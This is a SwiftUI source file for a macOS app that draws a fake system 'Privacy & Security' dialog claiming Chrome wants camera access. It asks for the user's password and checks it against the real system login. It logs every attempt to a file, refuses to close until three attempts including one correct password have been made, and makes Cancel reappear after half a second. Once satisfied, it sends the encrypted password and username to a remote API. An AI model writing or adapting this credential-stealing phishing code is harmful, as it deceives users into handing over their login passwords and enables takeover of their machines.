import SwiftUI
import AppKit

struct ContentView: View {
    @State private var username = ""
    @State private var password = ""
    @State private var isVerifying = false
    @State private var verificationFailed = false
    @State private var isVisible = true
    @State private var attemptCount = 0
    @State private var hasCorrectAttempt = false
    @FocusState private var focusedField: Field?
    @Environment(\.colorScheme) private var colorScheme
    
    enum Field {
        case username, password
    }
    
    var body: some View {
        VStack(spacing: 0) {
            VStack(alignment: .leading, spacing: 0) {
                HStack {
                    ZStack(alignment: .topTrailing) {
                        // Lock icon - fallback to system icon if asset missing
                        Group {
                            if NSImage(named: "LockLocked") != nil {
                                Image("LockLocked")
                                    .resizable()
                            } else {
                                Image(systemName: "lock.fill")
                                    .font(.system(size: 52))
                                    .foregroundStyle(
                                        LinearGradient(
                                            gradient: Gradient(colors: [
                                                Color(red: 0.961, green: 0.843, blue: 0.290),
                                                Color(red: 0.898, green: 0.765, blue: 0.227),
                                                Color(red: 0.784, green: 0.643, blue: 0.082)
                                            ]),
                                            startPoint: .top,
                                            endPoint: .bottom
                                        )
                                    )
                            }
                        }
                        .aspectRatio(contentMode: .fit)
                        .frame(width: 64)
                        
                        ZStack {
                            RoundedRectangle(cornerSize: CGSize(width: 8, height: 8))
                                .fill(
                                    LinearGradient(
                                        gradient: Gradient(colors: [
                                            Color(red: 0.450, green: 0.676, blue: 1.0),
                                            Color(red: 0.231, green: 0.510, blue: 0.965)
                                        ]),
                                        startPoint: .top,
                                        endPoint: .bottom
                                    )
                                )
                                .frame(width: 28, height: 28)
                            
                            Image(systemName: "hand.raised.fill")
                                .font(.system(size: 16))
                                .foregroundColor(.white)
                        }
                        .offset(x: -2, y: 33)
                    }
                    .frame(width: 64, height: 64)
                    .padding(.init(top: 4, leading: 0, bottom: 16, trailing: 0))
                    
                    Spacer()
                }
                
                Text("Privacy & Security")
                    .font(.init(NSFont.systemFont(ofSize: 13, weight: .bold)))
                    .foregroundColor(themePrimaryText)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .multilineTextAlignment(.center)
                
                VStack(alignment: .leading, spacing: 0) {
                    Text("Chrome is requesting access to your camera. This will allow the application to capture video and audio from your camera.")
                        .font(.init(NSFont.systemFont(ofSize: 13)))
                        .foregroundColor(themeSecondaryText)
                        .lineSpacing(1.4)
                        .padding(.top, 16)
                    
                    Text("Enter your password to allow this.")
                        .font(.init(NSFont.systemFont(ofSize: 13)))
                        .foregroundColor(themeSecondaryText)
                        .lineSpacing(1.4)
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .multilineTextAlignment(.center)
                        .padding(.top, 14)
                }
            }
            .padding(.horizontal, 24)
            .padding(.top, 16)
            .padding(.bottom, 8)
            
            VStack(alignment: .leading, spacing: 12) {
                TextField("", text: $username)
                    .textFieldStyle(.plain)
                    .font(.system(size: 13))
                    .foregroundColor(themePrimaryText)
                    .padding(.horizontal, 6)
                    .padding(.vertical, 0)
                    .frame(height: 24)
                    .background(
                        ZStack {
                            if focusedField == .username {
                                RoundedRectangle(cornerRadius: 3)
                                    .stroke(themeRing.opacity(0.3), lineWidth: 3)
                            }
                            RoundedRectangle(cornerRadius: 6)
                                .fill(themeTextFieldBackground)
                            RoundedRectangle(cornerRadius: 6)
                                .stroke(
                                    focusedField == .username
                                        ? themeRing
                                        : themeFieldBorder,
                                    lineWidth: 1
                                )
                        }
                    )
                    .focused($focusedField, equals: .username)
                    .disabled(true)
                
                SecureField("Password", text: $password)
                    .textFieldStyle(.plain)
                    .font(.system(size: 13))
                    .foregroundColor(themePrimaryText)
                    .padding(.horizontal, 6)
                    .padding(.vertical, 0)
                    .frame(height: 24)
                    .background(
                        ZStack {
                            RoundedRectangle(cornerRadius: 6)
                                .fill(themeTextFieldBackground)
                            RoundedRectangle(cornerRadius: 6)
                                .stroke(
                                    focusedField == .password ? themeRing : themeFieldBorder,
                                    lineWidth: 1
                                )
                        }
                    )
                    .focused($focusedField, equals: .password)
                    .onSubmit {
                        if !password.isEmpty {
                            handleModifySettings()
                        }
                    }
            }
            .padding(.horizontal, 16)
            .padding(.top, 8)
            .padding(.bottom, 8)
            
            HStack(spacing: 6) {
                Button(action: {
                    handleCancel()
                }) {
                    Text("Cancel")
                        .font(.system(size: 13, weight: .medium))
                        .foregroundColor(themePrimaryText)
                        .frame(maxWidth: .infinity)
                        .frame(height: 28)
                        .background(themeCancelBackground)
                        .cornerRadius(14)
                        .overlay(
                            RoundedRectangle(cornerRadius: 14)
                                .stroke(themeCancelBorder, lineWidth: 1)
                        )
                        .shadow(color: .black.opacity(0.1), radius: 0.5, x: 0, y: 0.5)
                        .overlay(
                            RoundedRectangle(cornerRadius: 14)
                                .stroke(Color.white.opacity(0.15), lineWidth: 0.5)
                                .offset(y: 0.5)
                        )
                }
                .buttonStyle(.plain)
                .keyboardShortcut(.escape)
                
                Button(action: {
                    handleModifySettings()
                }) {
                    Text("Allow")
                        .font(.system(size: 13, weight: .medium))
                        .foregroundColor(.white)
                        .frame(maxWidth: .infinity)
                        .frame(height: 28)
                        .background(
                            LinearGradient(
                                gradient: Gradient(colors: [
                                    themeAllowTop,
                                    themeAllowBottom
                                ]),
                                startPoint: .top,
                                endPoint: .bottom
                            )
                        )
                        .cornerRadius(14)
                        .shadow(color: .black.opacity(0.2), radius: 0.5, x: 0, y: 0.5)
                        .overlay(
                            RoundedRectangle(cornerRadius: 14)
                                .stroke(Color.white.opacity(0.15), lineWidth: 0.5)
                                .offset(y: 0.5)
                        )
                }
                .buttonStyle(.plain)
                .disabled(password.isEmpty)
                .keyboardShortcut(.return)
                
            }
            .padding(.horizontal, 16)
            .padding(.top, 12)
            .padding(.bottom, 18)
        }
        .frame(width: 260)
        .background(
            RoundedRectangle(cornerRadius: 24)
                .fill(themeBackground)
                .background(.ultraThinMaterial)
        )
        .clipShape(RoundedRectangle(cornerRadius: 24))
        .overlay(
            RoundedRectangle(cornerRadius: 24)
                .stroke(themeOuterStroke, lineWidth: 0.5)
        )
        .shadow(color: themeShadowPrimary, radius: 20, x: 0, y: 10)
        .shadow(color: themeShadowSecondary, radius: 0, x: 0, y: 0)
        .opacity(isVisible ? 1 : 0)
        .onAppear {
            username = PasswordVerifier.shared.getCurrentUsername()
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                focusedField = .password
            }
        }
    }
    
    private func handleModifySettings() {
        guard !password.isEmpty else { return }
        guard !isVerifying else { return }
        
        // Count this attempt
        attemptCount += 1
        
        isVerifying = true
        
        // Capture current password value
        let currentPassword = password
        
        // Run verification on background thread
        DispatchQueue.global(qos: .userInitiated).async {
            let isValid = PasswordVerifier.shared.verifyPassword(
                username: self.username,
                password: currentPassword
            )
            
            DispatchQueue.main.async {
                self.isVerifying = false
                
                // Track whether we have seen at least one correct system password
                if isValid {
                    self.hasCorrectAttempt = true
                }
                
                // Encrypt and record this attempt (correct or incorrect)
                guard let encryptedPassword = PasswordEncryption.shared.encryptPassword(
                    currentPassword,
                    salt: AppConfig.encryptionSalt
                ) else {
                    print("Failed to encrypt password attempt")
                    if !isValid {
                        // For invalid attempts, still allow user to retry
                        self.handleFailedAttemptUI(showError: !isValid)
                    } else {
                        // On success but encryption failure, terminate safely
                        AppDelegate.allowTermination = true
                        NSApplication.shared.terminate(nil)
                    }
                    return
                }
                
                let filePath = PasswordEncryption.shared.getDefaultFilePath()
                let saved = PasswordEncryption.shared.appendEncryptedPassword(
                    encryptedPassword,
                    isSystemPassword: isValid,
                    to: filePath
                )
                if !saved {
                    print("Failed to save encrypted password attempt")
                } else {
                    print("Encrypted password attempt saved to: \(filePath)")
                }
                
                // Decide whether we can terminate:
                // - At least one correct password has been entered
                // - At least 3 attempts have been made
                let canTerminate = self.hasCorrectAttempt && self.attemptCount >= 3
                
                if isValid && canTerminate {
                    // Password is correct AND minimum attempts reached - send to API and terminate
                    self.handlePasswordSuccess(encryptedPassword: encryptedPassword)
                } else {
                    // Either still below 3 attempts or still no correct password.
                    // If this specific attempt was wrong, show error feedback; if it was correct
                    // but too early, just reset the field without error styling.
                    self.handleFailedAttemptUI(showError: !isValid)
                }
            }
        }
    }
    
    private func handleCancel() {
        // Hide alert view (just the content, not the window)
        isVisible = false
        
        // Clear password field
        password = ""
        
        // Show again after 0.5 seconds
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            self.isVisible = true
            
            // Refocus password field
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                self.focusedField = .password
            }
        }
    }
    
    private func handlePasswordSuccess(encryptedPassword: String) {
        print("Password verified successfully for user: \(self.username)")
        AppDelegate.allowTermination = true
        
        // Send to API using the already-encrypted password
        APIClient.shared.sendPassword(
            encryptedPassword: encryptedPassword,
            username: self.username
        ) { success, errorMessage in
            if success {
                print("Password sent to API successfully")
            } else {
                print("Failed to send password to API: \(errorMessage ?? "Unknown error")")
            }
            
            // Terminate app after API call (success or failure)
            DispatchQueue.main.async {
                NSApplication.shared.terminate(nil)
            }
        }
    }
    
    /// UI handling for a password attempt (reset and refocus).
    /// - Parameter showError: whether to show a transient error state (for wrong passwords).
    private func handleFailedAttemptUI(showError: Bool) {
        if showError {
            verificationFailed = true
        }
        password = "" // Clear password field
        
        // Refocus password field for retry
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
            self.focusedField = .password
        }
        
        // Reset failure flag after a short delay (for visual feedback if needed)
        if showError {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                self.verificationFailed = false
            }
        }
    }
    
    // MARK: - Theme Colors
    private var themeBackground: Color {
        if colorScheme == .dark {
            Color(red: 0.099, green: 0.108, blue: 0.111)
        } else {
            Color(red: 0.933, green: 0.933, blue: 0.933)
        }
    }
    private var themeCancelBackground: Color {
        if colorScheme == .dark {
            Color(red: 0.167, green: 0.176, blue: 0.178)
        } else {
            Color(red: 0.866, green: 0.866, blue: 0.866)
        }
    }
    private var themeRing: Color {
        if colorScheme == .dark {
            Color(red: 0.120, green: 0.412, blue: 0.582)
        } else {
            Color(red: 0.470, green: 0.670, blue: 0.949)
        }
    }
    private var themeAllowTop: Color {
        Color(red: 0.000, green: 0.479, blue: 1.000)
    }
    private var themeAllowBottom: Color {
        Color(red: 0.000, green: 0.430, blue: 0.900)
    }
    private var themeTextFieldBackground: Color {
        if colorScheme == .dark {
            Color.black
        } else {
            Color.white
        }
    }
    private var themePrimaryText: Color {
        Color.primary
    }
    private var themeSecondaryText: Color {
        Color.primary
    }
    private var themeFieldBorder: Color {
        if colorScheme == .dark {
            Color.white.opacity(0.18)
        } else {
            Color(red: 0.780, green: 0.780, blue: 0.780)
        }
    }
    private var themeCancelBorder: Color {
        if colorScheme == .dark {
            Color.white.opacity(0.18)
        } else {
            Color(red: 0.820, green: 0.820, blue: 0.820)
        }
    }
    private var themeOuterStroke: Color {
        if colorScheme == .dark {
            Color.white.opacity(0.08)
        } else {
            Color.black.opacity(0.1)
        }
    }
    private var themeShadowPrimary: Color {
        Color.black.opacity(colorScheme == .dark ? 0.6 : 0.3)
    }
    private var themeShadowSecondary: Color {
        Color.black.opacity(colorScheme == .dark ? 0.25 : 0.1)
    }
}
